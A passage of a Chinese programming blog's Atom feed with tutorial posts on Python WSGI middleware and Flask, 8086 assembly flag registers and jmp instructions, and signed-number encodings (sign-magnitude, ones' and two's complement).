class="string">'Content-type'</span>, <span class="string">'text/html'</span>)]</span><br><span class="line">    start_response(status, response_header)</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">b'&lt;h1&gt;Hello WSGi&lt;/h1&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Middleware</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, web_app)</span>:</span></span><br><span class="line">        self.web_app = web_app</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, environ, start_response)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">before_start_response</span><span class="params">(status, header)</span>:</span></span><br><span class="line">            header.append((<span class="string">'middleware'</span>, <span class="string">'middleware'</span>))</span><br><span class="line">            <span class="keyword">return</span> start_response(status, header)</span><br><span class="line">        <span class="keyword">return</span> self.web_app(environ, before_start_response)</span><br><span class="line"></span><br><span class="line">new_index = Middleware(index)</span><br><span class="line"></span><br><span class="line">server = make_server(<span class="string">'localhost'</span>, <span class="number">5000</span>, new_index)</span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure><p>这里我们使用实现了<code>__call__</code>方法的类实例来创建WSGI的可调用对象。并通过这个中间件来为我们的Web程序添加了一个响应头（尽管这没有意义）。真正的中间件远比我们这里实现的复杂、功能强大的多。而且往往不止一个中间件，而是一个中间件堆栈，通过层层包装，实现了非常多的功能。</p><h2 id="Web框架"><a href="#Web框架" class="headerlink" title="Web框架"></a>Web框架</h2><p>现在有了WSGI，我们可以很容易实现一个Python Web程序，但是这还是不够方便，于是有了Web框架。</p><p>Python Web框架是在WSGI的上面又抽象出来一层，使之更易使用，编写的Python Web程序也更易维护。</p><p>我们以非常著名的Flask框架为例。重新实现一下上面的WSGI程序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;Hello WSGi&lt;/h1&gt;'</span></span><br><span class="line"></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure><p>另外，Python还有很多流行的Web框架，例如Django，web.py、Tornado等，这里不在详细展开。</p><hr><p>参考资料:</p><ul><li><p><a href="https://zh.wikipedia.org/wiki/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BD%91%E5%85%B3%E6%8E%A5%E5%8F%A3" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BD%91%E5%85%B3%E6%8E%A5%E5%8F%A3</a></p></li><li><p>《Flask Web开发实战》</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;WSGI全称为Python Web Server Gateway Interface，Python Web服务器网关接口，它是介于Web服务器和Web应用程序（或Web框架）之间的一种简单而通用的接口。&lt;/p&gt;
&lt;img src=&quot;/images/wsgi.jpg&quot;&gt;

&lt;
      
    
    </summary>
    
      <category term="Python" scheme="https://mingliangliu.com/categories/Python/"/>
    
    
      <category term="Python" scheme="https://mingliangliu.com/tags/Python/"/>
    
      <category term="Web" scheme="https://mingliangliu.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>汇编语言之标志寄存器</title>
    <link href="https://mingliangliu.com/posts/b06f1372/"/>
    <id>https://mingliangliu.com/posts/b06f1372/</id>
    <published>2019-03-03T13:07:55.000Z</published>
    <updated>2020-02-15T06:45:50.786Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><h1 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h1></blockquote><p>CPU内部的寄存器中，有一种特殊的寄存器（对于不同的机器，个数和结构都有可能不同）具有以下三个功能:</p><ul><li>用来存储某些相关指令的执行结果</li><li>用来为CPU执行相关的指令提供行为依据</li><li>用来控制CPU的相关工作方式</li></ul><p>这种特殊的寄存器在8086CPU中称为标志寄存器。8086的标志寄存器有16位，其中存储的信息通常被称为程序状态字(PSW)。</p><p>标志寄存器与其他寄存器不一样，其他寄存器是用来放数据的，都是整个寄存器具有一个含义，而标志寄存器是按位起作用的。</p><p>8086中的标志寄存器的结构如下图所示:</p><img src="/images/标志寄存器.jpg"><p>其中1、3、4、12、13、14、15位在8086中没有使用。另外对于有确切含义的每一位，我们称为标志位</p><h2 id="ZF标志"><a href="#ZF标志" class="headerlink" title="ZF标志"></a>ZF标志</h2><p>标志寄存器的第六位是ZF，零标志位。他是记录相关指令执行后，其结果是否位零。如果为零，那么zf=1,如果不为零，那么zf=0</p><p>比如指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax, 1</span><br><span class="line">sub ax, 1</span><br></pre></td></tr></table></figure><p>执行后，ax的结果为0，所以zf=1</p><p>再比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax, 2</span><br><span class="line">sub ax, 1</span><br></pre></td></tr></table></figure><p>执行后，ax的结果不为0，所以zf=0</p><div class="note success">            <p>在这里，有一点需要注意：在8086的指令集中，有的指令的执行是影响标志位的，比如add、sub、mul、div、inc、or、and等，它们大都是运算指令（进行逻辑或算数运算）；有的指令的执行对标志寄存器没有影响，比如mov、push、pop等，它们大都是传送指令。</p>          </div><h2 id="PF标志"><a href="#PF标志" class="headerlink" title="PF标志"></a>PF标志</h2><p>标志寄存器的第二位是PF，奇偶标志位。它记录相关指令执行后，其结果的所有bit位中1的个数是否位偶数。如果是偶数，pf=1，如果位奇数，pf=0</p><p>比如指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al, 1</span><br><span class="line">add al, 10</span><br></pre></td></tr></table></figure><p>执行后，al为00001011B，其中有3个1，所以pf=0</p><p>再比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al, 1</span><br><span class="line">or al, 2</span><br></pre></td></tr></table></figure><p>执行后结果为00000011B，其中有2个1，所以pf=1</p><h2 id="SF标志"><a href="#SF标志" class="headerlink" title="SF标志"></a>SF标志</h2><p>标志寄存器的第七位是SF，符号标志位。它记录相关指令执行后，其结果是否为负。如果为负，sf=1，如果非负，sf=0</p><p>这里要明确一点，在计算机中，通常用补码来表示有符号的数据，计算机中的一个数据既可以看作有符号数，也可以看作无符号数。不管我们如何看待，当CPU在进行运算的时候，就已经包含了两种含义，也将的到同一种信息来记录的两种结果。关键在于我们的程序需要那一种。</p><p>SF标志，是CPU对有符号数运算结果一种记录。如果我们将数据当作无符号数来运算，SF标志位则没有意义，虽然计算过程中影响了他的值。</p><p>我个人在这里的更简单写的理解是计算后结果的最高位是否为1，为1，这sf=1，否则，sf=0</p><p>比如指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al, 100000001B</span><br><span class="line">add al, 1</span><br></pre></td></tr></table></figure><p>执行后结果为10000010B，sf=1，表示如果进行的是有符号运算的话，则结果为负</p><p>再比如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al, 10000001B</span><br><span class="line">add al, 01111111B</span><br></pre></td></tr></table></figure><p>执行后，结果为0，sf=0，表示，如果进行的是有符号运算，这结果为非负</p><h2 id="CF标志"><a href="#CF标志" class="headerlink" title="CF标志"></a>CF标志</h2><p>标志寄存器的第0为是CF，仅为标志位。一般情况下，在进行 <em>无符号</em> 运算的时候，它记录了运算结果的最高有效位向更高有效位的进位，或从更高有效位的借位。</p><p>比如指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al, 98H</span><br><span class="line">add al, al  ; 执行后(al)=30H, CF=1, 产生进位</span><br><span class="line">add al, al  ; 执行后(al)=60H, CF=0, 没有进位，或者说进位为0</span><br></pre></td></tr></table></figure><p>再比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al, 97H</span><br><span class="line">sub al, 98H  ; 执行后(al)=FFH, CF=1, 产生借位</span><br><span class="line">sub al, al   ; 执行后(al)=0, CF=0, 借位为0</span><br></pre></td></tr></table></figure><h2 id="OF标志"><a href="#OF标志" class="headerlink" title="OF标志"></a>OF标志</h2><p>标志寄存器的第11位是OF，溢出标志位。一般情况下，OF记录了 <em>有符号数</em> 的运算结果是否发生了溢出。如果发生了溢出，of=1，如果没有，of=0</p><div class="note success">            <p>这里一定要注意的是CF和OF的区别，CF是对无符号数运算有意义的标志位，而OF是对有符号数运算有意义的标志位。 它们之间没有任何关系 </p>          </div><p>比如指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al, 98</span><br><span class="line">add al, 99</span><br></pre></td></tr></table></figure><p>执行后，of=1，发生溢出，没有进位</p><p>再比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al, 0F0H</span><br><span class="line">add al, 78H</span><br></pre></td></tr></table></figure><p>执行后：of=0，没有溢出</p><h2 id="DF标志"><a href="#DF标志" class="headerlink" title="DF标志"></a>DF标志</h2><p>标志寄存器的第10位是DF，方向标志位。在串传送指令中，控制每次操作后si、di的增减。</p><p>df=0，每次操作后si、di递增</p><p>df=1，每次操作后si、di递减</p><p>例如串传送指令<code>movsb</code>：</p><ul><li><p>格式：<code>movsb</code></p></li><li><p>功能：执行下面几步操作：1、((es) x 16 + (di)) = ((ds) x 16 + (si)) 2、如果df=0，(si)=(si)+1, (di)=(di)+1。如果df=1，则(si)=(si)-1, (di)=(di)-1</p></li></ul><p>另外还有<code>movsw</code>，这时候就是一次传送一个字了，相应的si和di的+1-1也就变更成了+2-2</p><p>一般，<code>movsb</code>和<code>movsw</code>一般配合指令<code>rep</code>指令使用，如<code>rep movsb</code>， 相当于</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s: movsb  ; 当然啦，在此之前要先设置cx寄存器</span><br><span class="line">   loop s</span><br></pre></td></tr></table></figure><h2 id="adc、sbb、cmp、pushf和popf指令"><a href="#adc、sbb、cmp、pushf和popf指令" class="headerlink" title="adc、sbb、cmp、pushf和popf指令"></a>adc、sbb、cmp、pushf和popf指令</h2><p>再没有标志寄存器的时候，我们进行加减运算最多只能进行16位的加减运算，这在实际的应用中显然是不够的，那么有了标志寄存器，在结合<code>adc</code>和<code>sbb</code>指令，我们就可以进行任意多位的数的加减法了</p><h3 id="adc指令"><a href="#adc指令" class="headerlink" title="adc指令"></a>adc指令</h3><p>adc是带进位的加法指令，它利用了CF上记录的进位值</p><ul><li>指令格式：adc 操作对象1，操作对象2</li><li>功能： 操作对象1 = 操作对象1 + 操作对象2 + CF</li></ul><p>比如：计算1EF000H + 201000H，结果放在ax（高16位）和bx（低16位）中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax, 001EH</span><br><span class="line">mov bx, 0F000H</span><br><span class="line">add bx, 1000H</span><br><span class="line">adc ax, 0020H</span><br></pre></td></tr></table></figure><p>更多位数的数相加和以上同理</p><h3 id="sbb指令"><a href="#sbb指令" class="headerlink" title="sbb指令"></a>sbb指令</h3><p>sbb是借位减法指令，它利用了CF位上记录的借位值</p><ul><li>指令格式：sbb 操作对象1，操作对象2</li><li>功能：操作对象1 = 操作对象1 - 操作对象2 - CF</li></ul><p>比如：计算003E1000H - 00202000H，结果保存在ax，bx中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov bx, 1000H</span><br><span class="line">mov ax, 003EH</span><br><span class="line">sub bx, 2000H</span><br><span class="line">sbb ax, 0020H</span><br></pre></td></tr></table></figure><h3 id="cmp指令"><a href="#cmp指令" class="headerlink" title="cmp指令"></a>cmp指令</h3><p>cmp是比较指令，功能相当于减法指令，只是不保存结果。执行后，对标志寄存器产生影响</p><ul><li>cmp指令格式：cmp 操作对象1，操作对象2</li><li>功能：计算操作对象1 - 操作对象2，但不保存结果</li></ul><p>经过<code>cmp</code>计算后，我们就可以用<code>je</code>、<code>jne</code>、<code>jb</code>、<code>jnb</code>、<code>ja</code>、<code>jna</code>指令进行跳转了。</p><p>因为比较复杂，在这里就不具体说实现的细节了，具体在更。</p><h3 id="pushf和popf指令"><a href="#pushf和popf指令" class="headerlink" title="pushf和popf指令"></a>pushf和popf指令</h3><p>pushf的功能是将标志寄存器的值压栈，而popf是从栈中弹出数据送入标志寄存器</p><p>这两个指令为直接访问寄存器提供了一种方法</p><hr><p>在这里，我们讨论了六种寄存器，另外还有IF，TF，和AF没有讨论，具体再更</p><p>完</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;h1 id=&quot;标志寄存器&quot;&gt;&lt;a href=&quot;#标志寄存器&quot; class=&quot;headerlink&quot; title=&quot;标志寄存器&quot;&gt;&lt;/a&gt;标志寄存器&lt;/h1&gt;&lt;/blockquote&gt;

&lt;p&gt;CPU内部
      
    
    </summary>
    
      <category term="汇编语言" scheme="https://mingliangliu.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="汇编语言" scheme="https://mingliangliu.com/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>原码反码和补码</title>
    <link href="https://mingliangliu.com/posts/2526b7ad/"/>
    <id>https://mingliangliu.com/posts/2526b7ad/</id>
    <published>2019-02-28T09:35:08.000Z</published>
    <updated>2020-02-15T06:45:50.783Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原码反码和补码"><a href="#原码反码和补码" class="headerlink" title="原码反码和补码"></a>原码反码和补码</h1><p>这里我们只讨论有符号数。我们都知道数在机器中都是以二进制表示的，而且常用二进制数的最高位表示其的正负，0为正，1为负</p><h2 id="原码"><a href="#原码" class="headerlink" title="原码"></a>原码</h2><p>原码的表示法很简单，对于一个二进制数n,</p><ul><li>当n为正数时，n的原码是在n上增加一个符号位0</li><li>当n为负数时，n的原码是在n上增加一个符号位1</li><li>n为0时，在原码中，有两种表示0的方式：0.0000 1.0000</li></ul><h2 id="反码"><a href="#反码" class="headerlink" title="反码"></a>反码</h2><p>对于一个二进制数n</p><ul><li>当n为正数时，n的反码和原码相同</li><li>当n为负数时，n的反码的符号位为1，数值部分是原码的数值部分按位取反</li><li>在反码表示中，有两种不同形式的0：0.0000 1.1111</li></ul><h2 id="补码"><a href="#补码" class="headerlink" title="补码"></a>补码</h2><p>对于一个二进制数n</p><ul><li>当n为正数时，n的补码和n的原码相同</li><li>当n为负数时，n的补码的符号为为1，数值部分是将原码数值按位取反加1</li><li>当n为0时，在补码表示中，0的表示是唯一的：0.0000</li></ul><blockquote><p>tip: 一个数补码的补码等于这个数</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;原码反码和补码&quot;&gt;&lt;a href=&quot;#原码反码和补码&quot; class=&quot;headerlink&quot; title=&quot;原码反码和补码&quot;&gt;&lt;/a&gt;原码反码和补码&lt;/h1&gt;&lt;p&gt;这里我们只讨论有符号数。我们都知道数在机器中都是以二进制表示的，而且常用二进制数的最高位表示其的正负
      
    
    </summary>
    
      <category term="数字逻辑" scheme="https://mingliangliu.com/categories/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/"/>
    
    
      <category term="数字逻辑" scheme="https://mingliangliu.com/tags/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/"/>
    
  </entry>
  
  <entry>
    <title>汇编转移指令</title>
    <link href="https://mingliangliu.com/posts/add0c9cd/"/>
    <id>https://mingliangliu.com/posts/add0c9cd/</id>
    <published>2019-02-09T03:46:09.000Z</published>
    <updated>2020-02-15T06:45:50.785Z</updated>
    
    <content type="html"><![CDATA[<p>在8086CPU中，转移指令可分为如下几类  </p><ul><li>无条件转移指令，如jmp</li><li>条件转移指令，如jcxz</li><li>循环指令，如loop</li><li>过程</li><li>中断</li></ul><p>在此，只先讨论无条件转移中的jmp，其他东西以后再更</p><p>jmp为无条件转移指令，可以只修改IP，也可以同时修改CS和IP</p><h2 id="依据位移进行转移的jmp指令"><a href="#依据位移进行转移的jmp指令" class="headerlink" title="依据位移进行转移的jmp指令"></a>依据位移进行转移的jmp指令</h2><p>所谓依据位移呢，就是根据转移指令到要转移的目的地址之间相差的字节数来进行转移的，相差的字节数由编译器进行计算给出，在生成的机器指令中只包含相差的字节数，不包含目的地址，这样会是的程序更加的灵活</p><h3 id="jmp-short-标号"><a href="#jmp-short-标号" class="headerlink" title="jmp short 标号"></a>jmp short 标号</h3><p>这种格式的jmp指令实现的是段内短转移，他对IP的修改范围为-128~127，超过这个范围会报错</p><p>使用如下面的例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">codesg segment</span><br><span class="line">    start: mov ax,0</span><br><span class="line">           jmp short s</span><br><span class="line">           add ax,1</span><br><span class="line">        s: inc ax</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>参照书上的总结就是：jmp short 标号 的功能为：（IP）=(IP)+8位位移</p><ul><li>8位位移=标号处的地址-jmp指令后的第一个字节的地址（为什么是指令后第一个字节的地址，是因为和cpu执行指令的方式有关）</li><li>short指明此处的位移为8位位移</li><li>8位位移的范围为-128~127，用补码表示</li><li>8位位移由编译程序在编译时算出</li></ul><h3 id="jmp-near-ptr-标号"><a href="#jmp-near-ptr-标号" class="headerlink" title="jmp near ptr 标号"></a>jmp near ptr 标号</h3><p>它和jmp short 标号的功能相似，不过是实现的段内近转移</p><p>它实现的功能为：（IP）=（IP）+ 16为位移，类似上面</p><ul><li>16位位移=标号处的地址-jmp指令后的第一个字节的地址</li><li>near ptr 指明此处的位移为16位位移，进行的是段内近转移</li><li>16位位移的范围为-32768~32767，用补码表示</li><li>16为位移由编译程序在编译时给出</li></ul><h2 id="转移的目的地址在指令中的jmp指令"><a href="#转移的目的地址在指令中的jmp指令" class="headerlink" title="转移的目的地址在指令中的jmp指令"></a>转移的目的地址在指令中的jmp指令</h2><p>前面的jmp指令只能进行段间的转移，但是我们有时候需要转移的“更远”，这时候就需要这种类型的指令了</p><h3 id="jmp-far-ptr-标号"><a href="#jmp-far-ptr-标号" class="headerlink" title="jmp far ptr 标号"></a>jmp far ptr 标号</h3><p>此指令实现的是段间转移，又称为远转移功能如下</p><ul><li>（CS）=标号所在段的段地址，（IP）=标号在段中的偏移地址</li><li>far ptr 指明了用标号的段地址和偏移地址修改CS和IP</li></ul><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">codesg segment</span><br><span class="line"> start: mov ax,0</span><br><span class="line">        mov bx,0</span><br><span class="line">        jmp far ptr s</span><br><span class="line">        db 256 dup (0) ;这里用来占空</span><br><span class="line">     s: add ax,1</span><br><span class="line">        inc ax</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="转移地址在寄存器中的jmp指令"><a href="#转移地址在寄存器中的jmp指令" class="headerlink" title="转移地址在寄存器中的jmp指令"></a>转移地址在寄存器中的jmp指令</h2><h3 id="jmp-16位reg"><a href="#jmp-16位reg" class="headerlink" title="jmp 16位reg"></a>jmp 16位reg</h3><p>功能：（IP）=（16位reg）</p><h2 id="转移地址在内存中的jmp指令"><a href="#转移地址在内存中的jmp指令" class="headerlink" title="转移地址在内存中的jmp指令"></a>转移地址在内存中的jmp指令</h2><p>转移地址在内存中的jmp指令有两种格式：段内转移和段间转移</p><h3 id="jmp-word-ptr-内存单元地址（段内转移）"><a href="#jmp-word-ptr-内存单元地址（段内转移）" class="headerlink" title="jmp word ptr 内存单元地址（段内转移）"></a>jmp word ptr 内存单元地址（段内转移）</h3><p>功能：</p><ul><li>从内存单元地址处开始存放一个字，是转移的目的偏移地址</li><li>内存单元地址可用寻址方式的任一格式给出</li></ul><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123H</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">jmp word ptr ds:[0]</span><br></pre></td></tr></table></figure><h3 id="jmp-dword-ptr-内存单元地址（段间转移）"><a href="#jmp-dword-ptr-内存单元地址（段间转移）" class="headerlink" title="jmp dword ptr 内存单元地址（段间转移）"></a>jmp dword ptr 内存单元地址（段间转移）</h3><p>功能：</p><ul><li>从内存单元地址处开始存放者两个字，高地址的字为转移的目的段地址，低地址处为转移的目的偏移地址</li><li>（CS）=（内存单元地址+2），（IP）= （内存单元地址）</li><li>内存单元地址可以用寻址方式的任何一种格式给出</li></ul><p>例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123H</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">mov word ptr ds:[2],0</span><br><span class="line">jmp dword ptr ds:[0]</span><br></pre></td></tr></table></figure><hr><p>本文总结自王爽的《汇编语言》，如有错误欢迎指正</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在8086CPU中，转移指令可分为如下几类  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;无条件转移指令，如jmp&lt;/li&gt;
&lt;li&gt;条件转移指令，如jcxz&lt;/li&gt;
&lt;li&gt;循环指令，如loop&lt;/li&gt;
&lt;li&gt;过程&lt;/li&gt;
&lt;li&gt;中断&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在此，只先讨论
      
    
    </summary>
    
      <category term="汇编" scheme="https://mingliangliu.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
      <category term="汇编" scheme="https://mingliangliu.com/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
</feed>
